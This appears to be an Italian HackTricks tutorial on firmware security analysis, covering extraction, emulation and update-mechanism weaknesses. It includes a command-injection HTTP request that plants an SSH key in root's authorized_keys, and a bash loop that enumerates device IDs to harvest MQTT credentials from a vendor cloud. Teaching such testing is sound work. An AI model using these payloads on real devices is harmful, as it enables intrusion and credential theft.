# Analisi del firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introduzione**

### Risorse correlate


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware è il software essenziale che permette ai dispositivi di funzionare correttamente gestendo e facilitando la comunicazione tra i componenti hardware e il software con cui gli utenti interagiscono. Viene memorizzato in memoria permanente, assicurando che il dispositivo possa accedere a istruzioni vitali dal momento dell'accensione, portando all'avvio del sistema operativo. Esaminare e, eventualmente, modificare il firmware è un passaggio critico per identificare vulnerabilità di sicurezza.

## **Raccolta delle informazioni**

**Raccolta delle informazioni** è un passaggio iniziale fondamentale per comprendere la composizione di un dispositivo e le tecnologie che utilizza. Questo processo implica la raccolta di dati su:

- L'architettura della CPU e il sistema operativo che esegue
- Specifiche del bootloader
- Layout hardware e datasheet
- Metriche della codebase e posizioni del sorgente
- Librerie esterne e tipi di licenze
- Cronologia degli aggiornamenti e certificazioni normative
- Diagrammi architetturali e di flusso
- Valutazioni di sicurezza e vulnerabilità individuate

A tal fine, gli strumenti di **open-source intelligence (OSINT)** sono inestimabili, così come l'analisi di eventuali componenti software open-source disponibili tramite processi di revisione manuale e automatizzata. Strumenti come [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) offrono analisi statica gratuite che possono essere sfruttate per trovare potenziali problemi.

## **Ottenere il firmware**

Ottenere il firmware può essere affrontato attraverso vari mezzi, ognuno con il proprio livello di complessità:

- **Direttamente** dalla fonte (sviluppatori, produttori)
- **Costruendolo** seguendo le istruzioni fornite
- **Scaricandolo** dai siti di supporto ufficiali
- Utilizzando query **Google dork** per trovare file firmware ospitati
- Accedendo direttamente allo **cloud storage**, con strumenti come [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercettando gli **aggiornamenti** tramite tecniche man-in-the-middle
- **Estraendolo** dal dispositivo tramite connessioni come **UART**, **JTAG**, o **PICit**
- **Sniffing** di richieste di aggiornamento nella comunicazione del dispositivo
- Identificare e usare **hardcoded update endpoints**
- **Dumping** dal bootloader o dalla rete
- **Rimuovendo e leggendo** il chip di memoria, quando tutto il resto fallisce, usando strumenti hardware appropriati

## Analisi del firmware

Ora che **hai il firmware**, devi estrarre informazioni su di esso per sapere come trattarlo. Strumenti diversi che puoi usare per questo:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Se non trovi molto con quegli strumenti, controlla l'**entropia** dell'immagine con `binwalk -E <bin>`. Se l'entropia è bassa, allora probabilmente non è cifrata. Se l'entropia è alta, è probabile che sia cifrata (o compressa in qualche modo).

Moreover, you can use these tools to extract **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Or [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) per ispezionare il file.

### Ottenere il Filesystem

Con gli strumenti citati in precedenza come `binwalk -ev <bin>` dovresti essere stato in grado di **estrarre il filesystem**.\
Binwalk di solito lo estrae all'interno di una **cartella nominata secondo il tipo di filesystem**, che di solito è uno dei seguenti: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Estrazione Manuale del Filesystem

A volte binwalk **non ha il byte magico del filesystem nelle sue firme**. In questi casi, usa binwalk per **trovare l'offset del filesystem ed eseguire il carving del filesystem compresso** dal binario ed **estrarre manualmente** il filesystem in base al suo tipo usando i passaggi seguenti.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Esegui il seguente **dd command** carving the Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
In alternativa, può essere eseguito anche il seguente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Per squashfs (usato nell'esempio sopra)

`$ unsquashfs dir.squashfs`

I file saranno successivamente nella directory `squashfs-root`.

- Per file di archivio CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Per filesystem jffs2

`$ jefferson rootfsfile.jffs2`

- Per filesystem ubifs con NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisi del Firmware

Una volta ottenuto il firmware, è essenziale dissotterrarlo per comprendere la sua struttura e le potenziali vulnerabilità. Questo processo implica l'utilizzo di vari strumenti per analizzare ed estrarre dati utili dall'immagine del firmware.

### Strumenti per l'analisi iniziale

Viene fornito un insieme di comandi per l'ispezione iniziale del file binario (indicato come `<bin>`). Questi comandi aiutano a identificare i tipi di file, estrarre le stringhe, analizzare i dati binari e comprendere i dettagli di partizione e filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Per valutare lo stato di cifratura dell'immagine, si verifica l'**entropia** con `binwalk -E <bin>`. Un'entropia bassa suggerisce assenza di cifratura, mentre un'entropia alta indica possibile cifratura o compressione.

Per estrarre i **file incorporati**, si consigliano strumenti e risorse come la documentazione **file-data-carving-recovery-tools** e **binvis.io** per l'ispezione dei file.

### Estrazione del filesystem

Usando `binwalk -ev <bin>` è generalmente possibile estrarre il filesystem, spesso in una directory chiamata come il tipo di filesystem (es. squashfs, ubifs). Tuttavia, quando **binwalk** non riesce a riconoscere il tipo di filesystem a causa della mancanza dei magic bytes, è necessario procedere all'estrazione manuale. Questo comporta l'uso di `binwalk` per individuare l'offset del filesystem, seguito dal comando `dd` per ricavare il filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Successivamente, a seconda del tipo di filesystem (es. squashfs, cpio, jffs2, ubifs), vengono usati comandi diversi per estrarre manualmente i contenuti.

### Analisi del filesystem

Con il filesystem estratto, inizia la ricerca di vulnerabilità. Si presta attenzione a network daemons insicuri, hardcoded credentials, API endpoints, funzionalità di update server, codice non compilato, startup scripts e compiled binaries per analisi offline.

**Posizioni chiave** e **elementi** da ispezionare includono:

- **etc/shadow** e **etc/passwd** per le credenziali utente
- Certificati e chiavi SSL in **etc/ssl**
- File di configurazione e script per possibili vulnerabilità
- Binari embedded per analisi approfondita
- Web server comuni dei dispositivi IoT e binari

Diversi tool aiutano a scovare informazioni sensibili e vulnerabilità all'interno del filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) per la ricerca di informazioni sensibili
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) per un'analisi completa del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), e [**EMBA**](https://github.com/e-m-b-a/emba) per analisi statica e dinamica

### Controlli di sicurezza sui binari compilati

Sia il codice sorgente che i binari compilati trovati nel filesystem devono essere esaminati per vulnerabilità. Tool come **checksec.sh** per i binari Unix e **PESecurity** per i binari Windows aiutano a identificare binari non protetti che potrebbero essere sfruttati.

## Estrazione della cloud config e delle credenziali MQTT tramite token URL derivati

Molti hub IoT recuperano la loro configurazione per dispositivo da un endpoint cloud che appare come:

- `https://<api-host>/pf/<deviceId>/<token>`

Durante l'analisi del firmware potresti scoprire che `<token>` è derivato localmente dal deviceId utilizzando un secret hardcoded, per esempio:

- token = MD5( deviceId || STATIC_KEY ) e rappresentato come esadecimale maiuscolo

Questo design permette a chiunque conosca un deviceId e la STATIC_KEY di ricostruire l'URL e scaricare la cloud config, rivelando spesso credenziali MQTT in chiaro e prefissi di topic.

Flusso di lavoro pratico:

1) Estrai il deviceId dai log di avvio UART

- Collega un adattatore UART a 3.3V (TX/RX/GND) e cattura i log:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Cerca le righe che stampano il cloud config URL pattern e il broker address, per esempio:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperare STATIC_KEY e l'algoritmo del token dal firmware

- Caricare i binari in Ghidra/radare2 e cercare il percorso di configurazione ("/pf/") o l'uso di MD5.
- Confermare l'algoritmo (es., MD5(deviceId||STATIC_KEY)).
- Derivare il token in Bash e convertire il digest in maiuscolo:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Raccogli la config cloud e le credenziali MQTT

- Componi l'URL e scarica il JSON con curl; analizzalo con jq per estrarre i segreti:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abusa di MQTT in chiaro e di ACLs di topic deboli (se presenti)

- Usa le credenziali recuperate per sottoscrivere i topic di manutenzione e cercare eventi sensibili:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerare device IDs prevedibili (su larga scala, con autorizzazione)

- Molti ecosistemi incorporano byte vendor OUI/product/type seguiti da un suffisso sequenziale.
- Puoi iterare candidate IDs, derivare tokens e fetch configs programmaticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Note
- Ottieni sempre un'autorizzazione esplicita prima di tentare enumerazioni di massa.
- Preferisci l'emulazione o l'analisi statica per recuperare segreti senza modificare l'hardware target quando possibile.


Il processo di emulazione del firmware permette la **dynamic analysis** sia del funzionamento di un dispositivo sia di un singolo programma. Questo approccio può incontrare difficoltà dovute a dipendenze hardware o di architettura, ma trasferire il root filesystem o binari specifici su un dispositivo con architettura e endianness corrispondenti, come un Raspberry Pi, o su una macchina virtuale preconfigurata, può facilitare ulteriori test.

### Emulare singoli binari

Per esaminare singoli programmi, è cruciale identificare l'endianess e la CPU architecture del programma.

#### Esempio con architettura MIPS

Per emulare un binario per architettura MIPS, si può usare il comando:
```bash
file ./squashfs-root/bin/busybox
```
E per installare gli strumenti di emulazione necessari:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Per MIPS (big-endian) si usa `qemu-mips`, mentre per i binari little-endian la scelta è `qemu-mipsel`.

#### Emulazione dell'architettura ARM

Per i binari ARM il processo è simile, utilizzando l'emulatore `qemu-arm` per l'emulazione.

### Emulazione dell'intero sistema

Strumenti come [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) e altri facilitano l'emulazione completa del firmware, automatizzando il processo e aiutando l'analisi dinamica.

## Analisi dinamica nella pratica

A questo stadio si usa un ambiente dispositivo reale o emulato per l'analisi. È fondamentale mantenere l'accesso shell al sistema operativo e al filesystem. L'emulazione potrebbe non imitare perfettamente le interazioni hardware, rendendo necessari riavvii dell'emulazione. L'analisi dovrebbe riesaminare il filesystem, sfruttare pagine web esposte e servizi di rete, ed esplorare vulnerabilità del bootloader. I test di integrità del firmware sono critici per identificare potenziali backdoor.

## Tecniche di analisi a runtime

L'analisi a runtime consiste nell'interagire con un processo o un binario nel suo ambiente operativo, usando strumenti come gdb-multiarch, Frida e Ghidra per impostare breakpoint e identificare vulnerabilità tramite fuzzing e altre tecniche.

## Binary Exploitation and Proof-of-Concept

Sviluppare un PoC per vulnerabilità individuate richiede una profonda comprensione dell'architettura target e la programmazione in linguaggi di basso livello. Le protezioni a runtime sui binari nei sistemi embedded sono rare, ma quando presenti possono rendersi necessarie tecniche come Return Oriented Programming (ROP).

## Sistemi operativi pronti per l'analisi del firmware

Sistemi operativi come [AttifyOS](https://github.com/adi0x90/attifyos) e [EmbedOS](https://github.com/scriptingxss/EmbedOS) forniscono ambienti preconfigurati per il testing della sicurezza del firmware, dotati degli strumenti necessari.

## Sistemi operativi preparati per analizzare il firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS è una distro pensata per aiutarti a svolgere security assessment e penetration testing dei dispositivi Internet of Things (IoT). Ti fa risparmiare molto tempo fornendo un ambiente preconfigurato con tutti gli strumenti necessari già caricati.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Sistema operativo per il security testing dei dispositivi embedded basato su Ubuntu 18.04, preconfigurato con strumenti per il testing della sicurezza del firmware.

## Attacchi di downgrade del firmware e meccanismi di aggiornamento insicuri

Anche quando un vendor implementa controlli di firma crittografica per le immagini firmware, **la protezione contro il version rollback (downgrade) è frequentemente omessa**. Quando il boot- o recovery-loader verifica solo la firma con una chiave pubblica incorporata ma non confronta la *version* (o un contatore monotono) dell'immagine che viene flashata, un attaccante può installare legittimamente un **firmware più vecchio e vulnerabile che conserva ancora una firma valida** e quindi reintrodurre vulnerabilità già corrette.

Flusso di attacco tipico:

1. **Ottenere un'immagine firmata più vecchia**
* Recuperala dal portale di download pubblico del vendor, dal CDN o dal sito di supporto.
* Estraila da applicazioni companion mobile/desktop (per es. dentro un APK Android sotto `assets/firmware/`).
* Recuperala da repository di terze parti come VirusTotal, archivi Internet, forum, ecc.
2. **Caricare o servire l'immagine al dispositivo** tramite qualsiasi canale di aggiornamento esposto:
* Web UI, mobile-app API, USB, TFTP, MQTT, ecc.
* Molti dispositivi IoT consumer espongono endpoint HTTP(S) *unauthenticated* che accettano blob firmware codificati in Base64, li decodificano lato server e attivano recovery/upgrade.
3. Dopo il downgrade, sfruttare una vulnerabilità che era stata patchata nella release più recente (ad esempio un filtro per command-injection aggiunto successivamente).
4. Opzionalmente flashare di nuovo l'immagine più recente o disabilitare gli aggiornamenti per evitare la rilevazione una volta ottenuta la persistenza.

### Esempio: Command Injection dopo il downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Nel firmware vulnerabile (downgraded), il parametro `md5` viene concatenato direttamente in un comando shell senza sanitizzazione, permettendo l'iniezione di comandi arbitrari (qui – abilitando l'accesso root via SSH con chiave). Le versioni successive del firmware hanno introdotto un filtro di caratteri di base, ma l'assenza di protezione contro il downgrade rende la correzione inutile.

### Estrazione del firmware dalle app mobile

Molti vendor includono immagini firmware complete all'interno delle loro app companion in modo che l'app possa aggiornare il dispositivo tramite Bluetooth/Wi-Fi. Questi pacchetti sono comunemente memorizzati non criptati nell'APK/APEX sotto percorsi come `assets/fw/` o `res/raw/`. Strumenti come `apktool`, `ghidra`, o anche il semplice `unzip` permettono di estrarre immagini firmate senza toccare l'hardware fisico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Checklist per valutare la logica di aggiornamento

* Il trasporto/l'autenticazione dell'*update endpoint* è adeguatamente protetto (TLS + authentication)?
* Il device confronta **version numbers** o un **monotonic anti-rollback counter** prima del flashing?
* L'image viene verificata all'interno di una secure boot chain (es. signatures checked by ROM code)?
* Il userland code esegue controlli di sanity aggiuntivi (es. allowed partition map, model number)?
* I flussi di update *partial* o *backup* riutilizzano la stessa validation logic?

> 💡  Se uno qualsiasi degli elementi sopra manca, la piattaforma è probabilmente vulnerabile a rollback attacks.

## Firmware vulnerabili per esercitarsi

Per esercitarsi nella scoperta di vulnerabilità nel firmware, usa i seguenti progetti di firmware vulnerabili come punto di partenza.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Riferimenti

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Formazione e Certificazione

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
